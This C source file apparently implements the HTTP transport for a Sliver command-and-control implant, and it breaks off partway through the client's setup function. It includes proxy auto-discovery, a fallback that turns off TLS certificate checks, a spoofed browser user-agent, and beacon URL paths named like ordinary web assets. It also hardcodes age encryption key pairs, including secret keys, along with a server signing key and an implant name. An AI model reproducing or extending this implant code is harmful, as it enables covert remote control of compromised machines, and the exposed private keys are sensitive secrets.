#include "pch.h"

LPSTR GetMethodString
(
	_In_ HttpMethod Method
)
{
	if (Method == GET) {
		return "GET";
	}
	else if (Method == POST) {
		return "POST";
	}
	else if (Method == PUT) {
		return "PUT";
	}
	else if (Method == PUT + 1) {
		return "DELETE";
	}
	else if (Method == HEAD) {
		return "HEAD";
	}
	else if (Method == OPTIONS) {
		return "OPTIONS";
	}
	else if (Method == TRCE) {
		return "TRACE";
	}
	else if (Method == CONNECT) {
		return "CONNECT";
	}
	else if (Method == MERGE) {
		return "MERGE";
	}
	else if (Method == PATCH) {
		return "PATCH";
	}
}

LPSTR GetContentTypeString
(
	_In_ ContentTy ContentTypeEnum
)
{
	if (ContentTypeEnum == ApplicationAtomXml) {
		return "application/atom+xml";
	}
	else if (ContentTypeEnum == ApplicationHttp) {
		return "application/http";
	}
	else if (ContentTypeEnum == ApplicationJavascript) {
		return "application/javascript";
	}
	else if (ContentTypeEnum == ApplicationJson) {
		return "application/json";
	}
	else if (ContentTypeEnum == ApplicationXjson) {
		return "application/x-json";
	}
	else if (ContentTypeEnum == ApplicationOctetstream) {
		return "application/octet-stream";
	}
	else if (ContentTypeEnum == ApplicationXWwwFormUrlencoded) {
		return "application/x-www-form-urlencoded";
	}
	else if (ContentTypeEnum == MultipartFormData) {
		return "multipart/form-data";
	}
	else if (ContentTypeEnum == Boundary) {
		return "boundary";
	}
	else if (ContentTypeEnum == FormData) {
		return "form-data";
	}
	else if (ContentTypeEnum == ApplicationXjavascript) {
		return "application/x-javascript";
	}
	else if (ContentTypeEnum == ApplicationXml) {
		return "application/xml";
	}
	else if (ContentTypeEnum == MessageHttp) {
		return "message/http";
	}
	else if (ContentTypeEnum == Text) {
		return "text";
	}
	else if (ContentTypeEnum == TextJavascript) {
		return "text/javascript";
	}
	else if (ContentTypeEnum == TextJson) {
		return "text/json";
	}
	else if (ContentTypeEnum == TextPlain) {
		return "text/plain";
	}
	else if (ContentTypeEnum == TextPlainUtf16) {
		return "text/plain; charset=utf-16";
	}
	else if (ContentTypeEnum == TextPlainUtf16le) {
		return "text/plain; charset=utf-16le";
	}
	else if (ContentTypeEnum == TextPlainUtf8) {
		return "text/plain; charset=utf-8";
	}
	else if (ContentTypeEnum == TextXjavascript) {
		return "text/x-javascript";
	}
	else if (ContentTypeEnum == TextXjson) {
		return "text/x-json";
	}
}

LPSTR GetHeaderString
(
	_In_ HttpHeader HeaderTy
)
{
	if (HeaderTy == Accept) {
		return "Accept";
	}
	else if (HeaderTy == AcceptCharset) {
		return "Accept-Charset";
	}
	else if (HeaderTy == AcceptEncoding) {
		return "Accept-Encoding";
	}
	else if (HeaderTy == AcceptLanguage) {
		return "Accept-Language";
	}
	else if (HeaderTy == AcceptRanges) {
		return "Accept-Ranges";
	}
	else if (HeaderTy == AccessControlAllowOrigin) {
		return "Access-Control-Allow-Origin";
	}
	else if (HeaderTy == Age) {
		return "Age";
	}
	else if (HeaderTy == Allow) {
		return "Allow";
	}
	else if (HeaderTy == Authorization) {
		return "Authorization";
	}
	else if (HeaderTy == CacheControl) {
		return "Cache-Control";
	}
	else if (HeaderTy == Connection) {
		return "Connection";
	}
	else if (HeaderTy == ContentEncoding) {
		return "Content-Encoding";
	}
	else if (HeaderTy == ContentLanguage) {
		return "Content-Language";
	}
	else if (HeaderTy == ContentLength) {
		return "Content-Length";
	}
	else if (HeaderTy == ContentLocation) {
		return "Content-Location";
	}
	else if (HeaderTy == ContentMd5) {
		return "Content-MD5";
	}
	else if (HeaderTy == ContentRange) {
		return "Content-Range";
	}
	else if (HeaderTy == ContentType) {
		return "Content-Type";
	}
	else if (HeaderTy == ContentDisposition) {
		return "Content-Disposition";
	}
	else if (HeaderTy == Date) {
		return "Date";
	}
	else if (HeaderTy == Etag) {
		return "ETag";
	}
	else if (HeaderTy == Expect) {
		return "Expect";
	}
	else if (HeaderTy == Expires) {
		return "Expires";
	}
	else if (HeaderTy == From) {
		return "From";
	}
	else if (HeaderTy == Host) {
		return "Host";
	}
	else if (HeaderTy == IfMatch) {
		return "If-Match";
	}
	else if (HeaderTy == IfModifiedSince) {
		return "If-Modified-Since";
	}
	else if (HeaderTy == IfNoneMatch) {
		return "If-None-Match";
	}
	else if (HeaderTy == IfRange) {
		return "If-Range";
	}
	else if (HeaderTy == IfUnmodifiedSince) {
		return "If-Unmodified-Since";
	}
	else if (HeaderTy == LastModified) {
		return "Last-Modified";
	}
	else if (HeaderTy == Location) {
		return "Location";
	}
	else if (HeaderTy == MaxForwards) {
		return "Max-Forwards";
	}
	else if (HeaderTy == Pragma) {
		return "Pragma";
	}
	else if (HeaderTy == ProxyAuthenticate) {
		return "Proxy-Authenticate";
	}
	else if (HeaderTy == ProxyAuthorization) {
		return "Proxy-Authorization";
	}
	else if (HeaderTy == Range) {
		return "Range";
	}
	else if (HeaderTy == Referer) {
		return "Referer";
	}
	else if (HeaderTy == RetryAfter) {
		return "Retry-After";
	}
	else if (HeaderTy == Server) {
		return "Server";
	}
	else if (HeaderTy == Te) {
		return "TE";
	}
	else if (HeaderTy == Trailer) {
		return "Trailer";
	}
	else if (HeaderTy == TransferEncoding) {
		return "Transfer-Encoding";
	}
	else if (HeaderTy == Upgrade) {
		return "Upgrade";
	}
	else if (HeaderTy == UserAgent) {
		return "User-Agent";
	}
	else if (HeaderTy == Vary) {
		return "Vary";
	}
	else if (HeaderTy == Via) {
		return "Via";
	}
	else if (HeaderTy == Warning) {
		return "Warning";
	}
	else if (HeaderTy == WwwAuthenticate) {
		return "WWW-Authenticate";
	}
}

static DWORD WinHttpDefaultProxyConstant()
{
#if _WIN32_WINNT >= _WIN32_WINNT_VISTA
#if _WIN32_WINNT < _WIN32_WINNT_WINBLUE
	if (!FSecure::IsWindows8Point1OrGreater())
	{
		// Not Windows 8.1 or later, use the default proxy setting
		return WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;
	}
#endif // _WIN32_WINNT < _WIN32_WINNT_WINBLUE

	// Windows 8.1 or later, use the automatic proxy setting
	return WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY;
#else  // ^^^ _WIN32_WINNT >= _WIN32_WINNT_VISTA ^^^ // vvv _WIN32_WINNT < _WIN32_WINNT_VISTA vvv
	return WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;
#endif // _WIN32_WINNT >= _WIN32_WINNT_VISTA
}

PHTTP_SESSION HttpSessionInit
(
	_In_opt_ PWEB_PROXY pProxyInfo
)
{
	DWORD dwAccessType = 0;
	WINHTTP_PROXY_INFO ProxyDefault;
	WINHTTP_CURRENT_USER_IE_PROXY_CONFIG ProxyIE;
	LPWSTR lpProxyName = NULL;
	LPWSTR lpProxyBypass = NULL;
	PHTTP_SESSION Result;
	LPWSTR lpHostName = NULL;

	Result = ALLOC(sizeof(HTTP_SESSION));
	SecureZeroMemory(&ProxyDefault, sizeof(ProxyDefault));
	SecureZeroMemory(&ProxyIE, sizeof(ProxyIE));
	if (pProxyInfo == NULL) {
		dwAccessType = WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;
		lpProxyName = WINHTTP_NO_PROXY_NAME;
		lpProxyBypass = WINHTTP_NO_PROXY_BYPASS;
	}
	else if (pProxyInfo->Mode == UseDefault) {
		dwAccessType = WinHttpDefaultProxyConstant();
	}
	else if (pProxyInfo->Mode == ProxyDisabled) {
		dwAccessType = WINHTTP_ACCESS_TYPE_NO_PROXY;
	}
	else if (pProxyInfo->Mode == UseAutoDiscovery) {
		dwAccessType = WinHttpDefaultProxyConstant();
		if (dwAccessType != WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY) {
			SecureZeroMemory(&ProxyDefault, sizeof(ProxyDefault));
			if (!WinHttpGetDefaultProxyConfiguration(&ProxyDefault) || ProxyDefault.dwAccessType == WINHTTP_ACCESS_TYPE_NO_PROXY) {
				if (WinHttpGetIEProxyConfigForCurrentUser(&ProxyIE)) {
					if (ProxyIE.fAutoDetect) {
						Result->ProxyAutoConfig = TRUE;
					}
					else if (ProxyIE.lpszAutoConfigUrl) {
						Result->ProxyAutoConfig = TRUE;
						Result->lpProxyAutoConfigUrl = ConvertWcharToChar(ProxyIE.lpszAutoConfigUrl);
					}
					else if (ProxyIE.lpszProxy)
					{
						dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
						lpProxyName = ProxyIE.lpszProxy;
						if (ProxyIE.lpszProxyBypass)
						{
							lpProxyBypass = DuplicateStrW(ProxyIE.lpszProxyBypass, 0);
						}
					}
				}
			}
		}
	}
	else {
		dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
		if ((pProxyInfo->pUri->bUseHttps && pProxyInfo->pUri->wPort == INTERNET_DEFAULT_HTTPS_PORT) || (!pProxyInfo->pUri->bUseHttps && pProxyInfo->pUri->wPort == INTERNET_DEFAULT_HTTP_PORT)) {
			lpProxyName = ConvertCharToWchar(pProxyInfo->pUri->lpHostName);
		}
		else {
			lpHostName = ConvertCharToWchar(pProxyInfo->pUri->lpHostName);
			lpProxyName = ALLOC((lstrlenW(lpHostName) + 10) * sizeof(WCHAR));
			wsprintfW(lpProxyName, L"%lls:%d", lpHostName, pProxyInfo->pUri->wPort);
		}
	}

	Result->hSession = WinHttpOpen(NULL, dwAccessType, lpProxyName, lpProxyBypass, 0);
	//Result->hSession = WinHttpOpen(NULL, dwAccessType, L"http://127.0.0.1:8888", L"<local>", 0);
	if (!Result->hSession) {
		LogError(L"WinHttpOpen failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		FreeHttpSession(Result);
		Result = NULL;
		goto CLEANUP;
	}

CLEANUP:
	if (lpHostName != NULL) {
		FREE(lpHostName);
	}

	if (lpProxyName != NULL) {
		FREE(lpProxyName);
	}

	if (lpProxyBypass != NULL) {
		FREE(lpProxyBypass);
	}

	return Result;
}

PHTTP_CLIENT HttpClientInit
(
	_In_ PURI pUri,
	_In_ PWEB_PROXY pProxyConfig
)
{
	PHTTP_CLIENT Result = NULL;
	LPWSTR lpHostName = NULL;
	
	lpHostName = ConvertCharToWchar(pUri->lpHostName);
	Result = ALLOC(sizeof(HTTP_CLIENT));
	Result->pUri = pUri;
	Result->pHttpSession = HttpSessionInit(pProxyConfig);
	Result->hConnection = WinHttpConnect(Result->pHttpSession->hSession, lpHostName, pUri->wPort, 0);
	if (Result->hConnection == NULL) {
		wprintf(L"WinHttpConnect failed at %lls. Last error: 0x%08x\n", __FUNCTIONW__, GetLastError());
		FreeHttpClient(Result);
		Result = NULL;
	}

	FREE(lpHostName);
	return Result;
}

BOOL SetHeader
(
	_In_ HINTERNET hRequest,
	_In_ LPSTR lpHeaderName,
	_In_ LPSTR lpHeaderData
)
{
	LPWSTR lpHeaderNameW = ConvertCharToWchar(lpHeaderName);
	LPWSTR lpHeaderDataW = ConvertCharToWchar(lpHeaderData);
	DWORD dwBufferLength = lstrlenW(lpHeaderNameW) + lstrlenW(lpHeaderDataW) + 10;
	LPWSTR lpFullHeader = ALLOC(dwBufferLength * sizeof(WCHAR));
	BOOL Result = FALSE;

	swprintf(lpFullHeader, dwBufferLength, L"%lls: %lls", lpHeaderNameW, lpHeaderDataW);
	if (StrCmpW(&lpFullHeader[lstrlenW(lpFullHeader) - 2], L"\r\n")) {
		StrCatW(lpFullHeader, L"\r\n");
	}

	Result = WinHttpAddRequestHeaders(hRequest, lpFullHeader, lstrlenW(lpFullHeader), WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
	if (!Result) {
		LogError(L"WinHttpAddRequestHeaders failed at %lls. Error code: 0x%08x.\n", __FUNCTIONW__, GetLastError());
	}

	FREE(lpFullHeader);
	FREE(lpHeaderNameW);
	FREE(lpHeaderDataW);
	return Result;
}

HINTERNET SendRequest
(
	_In_ PHTTP_CLIENT This,
	_In_ PHTTP_REQUEST pRequest,
	_In_ LPWSTR lpPath,
	_In_ DWORD dwNumberOfAttemps
)
{
	LPWSTR lpMethod = NULL;
	PURI pUri = This->pUri;
	LPWSTR pPath = NULL;
	HINTERNET hRequest = NULL;
	DWORD i = 0;
	PWINHTTP_PROXY_INFO pProxyInfo = NULL;
	DWORD dwLastError = 0;
	DWORD dwFlag = WINHTTP_FLAG_REFRESH;

	if (lpPath != NULL) {
		pPath = DuplicateStrW(lpPath, 0);
	}
	else if (lstrlenA(pUri->lpPathWithQuery) > 0) {
		pPath = ConvertCharToWchar(pUri->lpPathWithQuery);
	}

	lpMethod = ConvertCharToWchar(GetMethodString(pRequest->Method));
	if (pUri->bUseHttps) {
		dwFlag |= WINHTTP_FLAG_SECURE;
	}

	hRequest = WinHttpOpenRequest(This->hConnection, lpMethod, pPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, dwFlag);
	if (hRequest == NULL) {
		LogError(L"WinHttpOpenRequest failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, dwLastError);
		goto CLEANUP;
	}

	if (!WinHttpSetTimeouts(hRequest, pRequest->dwResolveTimeout, pRequest->dwConnectTimeout, pRequest->dwSendTimeout, pRequest->dwReceiveTimeout)) {
		LogError(L"WinHttpSetTimeouts failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, dwLastError);
		goto CLEANUP;
	}

	for (i = 0; i < _countof(pRequest->Headers); i++) {
		if (pRequest->Headers[i]) {
			SetHeader(hRequest, GetHeaderString(i), pRequest->Headers[i]);
		}
	}

	pProxyInfo = GetProxyForUrl(This->pHttpSession, This->pUri);
	if (pProxyInfo != NULL) {
		/*pProxyInfo = ALLOC(sizeof(WINHTTP_PROXY_INFO));
		pProxyInfo->dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
		pProxyInfo->lpszProxy = L"http://127.0.0.1:8888";
		pProxyInfo->lpszProxyBypass = L"<local>";*/
		WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY, pProxyInfo, sizeof(WINHTTP_PROXY_INFO));
	}

	i = 0;
	while (!WinHttpSendRequest(hRequest, NULL, 0, pRequest->lpData, pRequest->cbData, pRequest->cbData, NULL)) {
		dwLastError = GetLastError();
		LogError(L"WinHttpSendRequest failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, dwLastError);
		if (dwLastError == ERROR_WINHTTP_RESEND_REQUEST) {
			continue;
		}

		if (dwLastError == ERROR_WINHTTP_SECURE_FAILURE) {
			dwFlag = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
			if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlag, sizeof(dwFlag))) {
				LogError(L"WinHttpSetOption failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
				hRequest = NULL;
				goto CLEANUP;
			}
		}

		i++;
		if (i > dwNumberOfAttemps) {
			hRequest = NULL;
			goto CLEANUP;
		}
	}

	if (!WinHttpReceiveResponse(hRequest, NULL)) {
		LogError(L"WinHttpReceiveResponse failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		WinHttpCloseHandle(hRequest);
		hRequest = NULL;
		goto CLEANUP;
	}
CLEANUP:
	if (lpMethod != NULL) {
		FREE(lpMethod);
	}

	if (pPath != NULL) {
		FREE(pPath);
	}

	if (pProxyInfo != NULL) {
		FREE(pProxyInfo);
	}

	return hRequest;
}

PWINHTTP_PROXY_INFO GetProxyForUrl
(
	_In_ PHTTP_SESSION pHttpSession,
	_In_ PURI pUri
)
{
	WINHTTP_AUTOPROXY_OPTIONS AutoProxyOpt;
	PWINHTTP_PROXY_INFO Result = NULL;
	LPWSTR lpFullUri = NULL;

	if (!pHttpSession->ProxyAutoConfig) {
		return NULL;
	}

	SecureZeroMemory(&AutoProxyOpt, sizeof(AutoProxyOpt));
	if (!pHttpSession->lpProxyAutoConfigUrl) {
	//if (FALSE) {
		AutoProxyOpt.dwFlags = WINHTTP_AUTOPROXY_AUTO_DETECT;
		AutoProxyOpt.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
	}
	else {
		AutoProxyOpt.dwFlags = WINHTTP_AUTOPROXY_CONFIG_URL;
		//AutoProxyOpt.lpszAutoConfigUrl = ConvertCharToWchar("http://127.0.0.1:8888/script");
		AutoProxyOpt.lpszAutoConfigUrl = ConvertCharToWchar(pHttpSession->lpProxyAutoConfigUrl);
	}

	AutoProxyOpt.fAutoLogonIfChallenged = TRUE;
	Result = ALLOC(sizeof(WINHTTP_PROXY_INFO));
	lpFullUri = ConvertCharToWchar(pUri->lpFullUri);
	if (!WinHttpGetProxyForUrl(pHttpSession->hSession, lpFullUri, &AutoProxyOpt, Result)) {
		LogError(L"WinHttpGetProxyForUrl failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		FREE(Result);
		Result = NULL;
		goto CLEANUP;
	}

CLEANUP:
	if (AutoProxyOpt.lpszAutoConfigUrl != NULL) {
		FREE(AutoProxyOpt.lpszAutoConfigUrl);
	}

	if (lpFullUri != NULL) {
		FREE(lpFullUri);
	}

	return Result;
}

DWORD ReadStatusCode
(
	_In_ HINTERNET hRequest
)
{
	DWORD dwResult = 0;
	DWORD dwSize = sizeof(dwResult);

	if (!WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &dwResult, &dwSize, WINHTTP_NO_HEADER_INDEX)) {
		LogError(L"WinHttpQueryHeaders failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
		return 0;
	}
	
	return dwResult;
}

BOOL ReceiveData
(
	_In_ HINTERNET hRequest,
	_Out_ PBYTE* pData,
	_Out_ PDWORD pdwDataSize
)
{
	DWORD dwNumberOfBytesAvailable = 0;
	BOOL bResult = FALSE;
	PBYTE Buffer = NULL;
	DWORD dwNumberOfBytesRead = 0;
	DWORD dwTotalSize = 0;

	do {
		dwNumberOfBytesAvailable = 0;
		if (!WinHttpQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable)) {
			wprintf(L"WinHttpQueryDataAvailable failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
			goto END;
		}

		if (dwNumberOfBytesAvailable == 0) {
			break;
		}

		if (Buffer == NULL) {
			Buffer = ALLOC(dwNumberOfBytesAvailable);
		}
		else {
			Buffer = REALLOC(Buffer, dwTotalSize + dwNumberOfBytesAvailable);
		}

		dwNumberOfBytesRead = 0;
		if (!WinHttpReadData(hRequest, &Buffer[dwTotalSize], dwNumberOfBytesAvailable, &dwNumberOfBytesRead)) {
			wprintf(L"WinHttpReadData failed at %lls. Error code: 0x%08x\n", __FUNCTIONW__, GetLastError());
			goto END;
		}

		if (dwNumberOfBytesRead == 0) {
			break;
		}

		dwTotalSize += dwNumberOfBytesRead;
	} while (dwNumberOfBytesAvailable > 0);

	bResult = TRUE;
	*pData = Buffer;
	*pdwDataSize = dwTotalSize;
END:
	return bResult;
}

VOID FreeHttpSession
(
	_In_ PHTTP_SESSION pHttpSession
)
{
	if (pHttpSession != NULL) {
		if (pHttpSession->lpProxyAutoConfigUrl != NULL) {
			FREE(pHttpSession->lpProxyAutoConfigUrl);
		}

		if (pHttpSession->hSession != NULL) {
			WinHttpCloseHandle(pHttpSession->hSession);
		}

		FREE(pHttpSession);
	}
}

VOID FreeHttpClient
(
	_In_ PHTTP_CLIENT pHttpClient
)
{
	if (pHttpClient != NULL) {
		FreeUri(pHttpClient->pUri);
		FreeHttpSession(pHttpClient->pHttpSession);
		if (pHttpClient->hConnection != NULL) {
			WinHttpCloseHandle(pHttpClient->hConnection);
		}

		FREE(pHttpClient);
	}
}

VOID FreeHttpRequest
(
	_In_ PHTTP_REQUEST pHttpReq
)
{
	DWORD i = 0;

	if (pHttpReq != NULL) {
		for (i = 0; i < _countof(pHttpReq->Headers); i++) {
			if (pHttpReq->Headers[i] != NULL) {
				FREE(pHttpReq->Headers[i]);
			}
		}

		FREE(pHttpReq);
	}
}

VOID FreeSliverHttpClient
(
	_In_ PSLIVER_HTTP_CLIENT pClient
)
{
	DWORD i = 0;

	if (pClient == NULL) {
		return;
	}

	if (pClient->pSessionKey != NULL) {
		FREE(pClient->pSessionKey);
	}

	for (i = 0; i < _countof(pClient->PollPaths); i++) {
		if (pClient->PollPaths[i] != NULL) {
			FREE(pClient->PollPaths[i]);
		}
	}

	for (i = 0; i < _countof(pClient->PollFiles); i++) {
		if (pClient->PollFiles[i] != NULL) {
			FREE(pClient->PollFiles[i]);
		}
	}

	for (i = 0; i < _countof(pClient->SessionPaths); i++) {
		if (pClient->SessionPaths[i] != NULL) {
			FREE(pClient->SessionPaths[i]);
		}
	}

	for (i = 0; i < _countof(pClient->SessionFiles); i++) {
		if (pClient->SessionFiles[i] != NULL) {
			FREE(pClient->SessionFiles[i]);
		}
	}

	for (i = 0; i < _countof(pClient->ClosePaths); i++) {
		if (pClient->ClosePaths[i] != NULL) {
			FREE(pClient->ClosePaths[i]);
		}
	}

	for (i = 0; i < _countof(pClient->CloseFiles); i++) {
		if (pClient->CloseFiles[i] != NULL) {
			FREE(pClient->CloseFiles[i]);
		}
	}

	if (pClient->lpHostName != NULL) {
		FREE(pClient->lpHostName);
	}

	if (pClient->lpRecipientPubKey != NULL) {
		FREE(pClient->lpRecipientPubKey);
	}

	if (pClient->lpPeerPubKey != NULL) {
		FREE(pClient->lpPeerPubKey);
	}

	if (pClient->lpPeerPrivKey != NULL) {
		FREE(pClient->lpPeerPrivKey);
	}

	if (pClient->HttpConfig.lpUserAgent != NULL) {
		FREE(pClient->HttpConfig.lpUserAgent);
	}

	if (pClient->HttpConfig.lpAccessToken != NULL) {
		FREE(pClient->HttpConfig.lpAccessToken);
	}

	for (i = 0; i < _countof(pClient->HttpConfig.AdditionalHeaders); i++) {
		if (pClient->HttpConfig.AdditionalHeaders[i] != NULL) {
			FREE(pClient->HttpConfig.AdditionalHeaders[i]);
		}
	}

	if (pClient->lpServerMinisignPublicKey != NULL) {
		FREE(pClient->lpServerMinisignPublicKey);
	}

	FreeWebProxy(pClient->HttpConfig.pProxyConfig);
	FreeHttpClient(pClient->pHttpClient);
	FREE(pClient);
}

PHTTP_REQUEST CreateHttpRequest
(
	_In_ PHTTP_CONFIG pHttpConfig,
	_In_ HttpMethod Method,
	_In_ LPSTR lpData,
	_In_ DWORD cbData
)
{
	PHTTP_REQUEST Result = NULL;

	Result = ALLOC(sizeof(HTTP_REQUEST));
	Result->dwConnectTimeout = pHttpConfig->dwConnectTimeout;
	Result->dwResolveTimeout = pHttpConfig->dwResolveTimeout;
	Result->dwSendTimeout = pHttpConfig->dwSendTimeout;
	Result->dwReceiveTimeout = pHttpConfig->dwReceiveTimeout;
	if (lpData != NULL && cbData > 0) {
		Result->lpData = lpData;
		Result->cbData = cbData;
	}

	Result->Method = Method;
	return Result;
}

VOID FreeHttpResp
(
	_In_ PHTTP_RESP pResp
)
{
	if (pResp != NULL) {
		if (pResp->hRequest != NULL) {
			WinHttpCloseHandle(pResp->hRequest);
		}

		if (pResp->pRespData != NULL) {
			FREE(pResp->pRespData);
		}

		FREE(pResp);
	}
}

PHTTP_RESP SendHttpRequest
(
	_In_ PHTTP_CONFIG pHttpConfig,
	_In_ PHTTP_CLIENT pHttpClient,
	_In_ LPWSTR lpPath,
	_In_ HttpMethod Method,
	_In_ LPSTR lpContentType,
	_In_ LPSTR lpData,
	_In_ DWORD cbData,
	_In_ BOOL SetAuthorizationHeader,
	_In_ BOOL GetRespData
)
{
	PHTTP_REQUEST pHttpRequest = NULL;
	HINTERNET hRequest = NULL;
	DWORD dwStatusCode = 0;
	DWORD i = 0;
	DWORD cbResp = 0;
	PHTTP_RESP pResult = NULL;
	LPSTR lpAuthorizationHeader = NULL;

	pHttpRequest = CreateHttpRequest(pHttpConfig, Method, lpData, cbData);
	for (i = 0; i < HeaderEnumEnd; i++) {
		if (pHttpConfig->AdditionalHeaders[i] != NULL) {
			pHttpRequest->Headers[i] = DuplicateStrA(pHttpConfig->AdditionalHeaders[i], 0);
		}
	}

	if (lpContentType != NULL) {
		if (pHttpRequest->Headers[ContentType] != NULL) {
			FREE(pHttpRequest->Headers[ContentType]);
		}

		pHttpRequest->Headers[ContentType] = DuplicateStrA(lpContentType, 0);
	}
	
	if (pHttpRequest->Headers[CacheControl] != NULL) {
		FREE(pHttpRequest->Headers[CacheControl]);
	}

	pHttpRequest->Headers[CacheControl] = DuplicateStrA("no-cache", 0);
	if (pHttpRequest->Headers[UserAgent] != NULL) {
		FREE(pHttpRequest->Headers[UserAgent]);
	}

	pHttpRequest->Headers[UserAgent] = DuplicateStrA(pHttpConfig->lpUserAgent, 0);
	if (SetAuthorizationHeader) {
		lpAuthorizationHeader = ALLOC(lstrlenA("Bearer ") + lstrlenA(pHttpConfig->lpAccessToken) + 1);
		StrCpyA(lpAuthorizationHeader, "Bearer ");
		StrCatA(lpAuthorizationHeader, pHttpConfig->lpAccessToken);
		if (pHttpRequest->Headers[Authorization] != NULL) {
			FREE(pHttpRequest->Headers[Authorization]);
		}

		pHttpRequest->Headers[Authorization] = lpAuthorizationHeader;
	}

	if (!pHttpClient->pUri->bUseHttps && !pHttpConfig->DisableUpgradeHeader) {
		if (pHttpRequest->Headers[UpgradeInsecureRequests] != NULL) {
			FREE(pHttpRequest->Headers[UpgradeInsecureRequests]);
		}

		pHttpRequest->Headers[UpgradeInsecureRequests] = DuplicateStrA("1", 0);
	}

	hRequest = SendRequest(pHttpClient, pHttpRequest, lpPath, pHttpConfig->dwNumberOfAttemps);
	if (hRequest == NULL) {
		goto CLEANUP;
	}

	pResult = ALLOC(sizeof(HTTP_RESP));
	dwStatusCode = ReadStatusCode(hRequest);
	if (dwStatusCode == HTTP_STATUS_OK && GetRespData) {
		if (!ReceiveData(hRequest, &pResult->pRespData, &cbResp)) {
			if (pResult->pRespData != NULL) {
				FREE(pResult->pRespData);
				pResult->pRespData = NULL;
			}

			cbResp = 0;
		}
	}
	else if (dwStatusCode != HTTP_STATUS_OK) {
		LogError(L"Status code: %d at %lls\n", dwStatusCode, __FUNCTIONW__);
	}
	
	pResult->hRequest = hRequest;
	pResult->cbResp = cbResp;
	pResult->dwStatusCode = dwStatusCode;
CLEANUP:
	FreeHttpRequest(pHttpRequest);
	return pResult;
};

PSLIVER_HTTP_CLIENT SliverHttpClientInit
(
	_In_ LPSTR lpC2Url
)
{
	LPSTR lpProxy = NULL;
	PSLIVER_HTTP_CLIENT pResult = NULL;
	BOOL IsOk = FALSE;
	LPSTR lpEncodedSessionKey = NULL;
	PBYTE pTemp = NULL;

	// Tu dinh config --------------------------------------------------------------------
	/*CHAR szRecipientPubKey[] = "age1m425fl9w4cew5rgx9ea3x3k22w6aurzn96xqd0dutz0xa2d834ss2jqfkn";
	CHAR szPeerPubKey[] = "age1kqklxpvg45rw053jtwtcn2wn4wqetwy0mw6c0rln8m5a3tarlqcq94j8jq";
	CHAR szPrivPrivKey[] = "AGE-SECRET-KEY-1F7J93DWQMN49F3A333ZA3766LND9T3LMT3GK3QHYFCGCRPWEKQHQ6NF3LK";
	LPSTR PollPaths[] = { "bundles", "scripts", "script", "javascripts" };
	LPSTR PollFiles[] = { "route", "app", "app.min", "array" };
	LPSTR SessionPaths[] = { "rest", "v1", "auth", "authenticate" };
	LPSTR SessionFiles[] = { "rpc", "index", "admin", "register" };
	LPSTR ClosePaths[] = { "icons", "image", "icon", "png" };
	LPSTR CloseFiles[] = { "banner", "button", "avatar", "photo" };
	CHAR szUserAgent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36";*/

	// Laptop config ---------------------------------------------------------------------
	CHAR szRecipientPubKey[] = "age1urmls5nq4m8px0u5gscz7wyf04j8qk7mr8tcm5tn9fxym4p8l5wqwuzjjh";
	CHAR szPeerPubKey[] = "age1xxvadfula0d3heqzya5r4tkqscwmglhmnuwca9g05dwupk9qt3fsm0d40v";
	CHAR szPeerPrivKey[] = "AGE-SECRET-KEY-1G2J4HELJ5LWC5VNU3A94GGHZL7D2ADNQ4EZY9SHEH6ZMRHYY2D3QWJ8GAN";
	LPSTR PollPaths[] = { "bundles", "scripts", "script", "javascripts" };
	LPSTR PollFiles[] = { "route", "app", "app.min", "array" };
	LPSTR SessionPaths[] = { "rest", "v1", "auth", "authenticate" };
	LPSTR SessionFiles[] = { "rpc", "index", "admin", "register" };
	LPSTR ClosePaths[] = { "icons", "image", "icon", "png" };
	LPSTR CloseFiles[] = { "banner", "button", "avatar", "photo" };
	CHAR szUserAgent[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9265.982 Safari/537.36";
	CHAR szServerMinisignPubkey[] = "untrusted comment: minisign public key: F9A43AFEBB7285CF\nRWTPhXK7/jqk+fgv4PeSONGudrNMT8vzWQowzTfGwXlEvbGgKWSYamy2";
	UINT64 uEncoderNonce = 6979;
	CHAR szSliverClientName[32] = "ELDEST_ECONOMICS";
	// END -------------------------------------------------------------------------------
	DWORD i = 0;

	pResult = ALLOC(sizeof(SLIVER_HTTP_CLIENT));
	lstrcpyA(pResult->szSliverName, szSliverClientName);
	pResult->pSessionKey = GenRandomBytes(CHACHA20_KEY_SIZE);
	pResult->lpRecipientPubKey = DuplicateStrA(szRecipientPubKey, 0);
	pResult->lpPeerPubKey = DuplicateStrA(szPeerPubKey, 0);
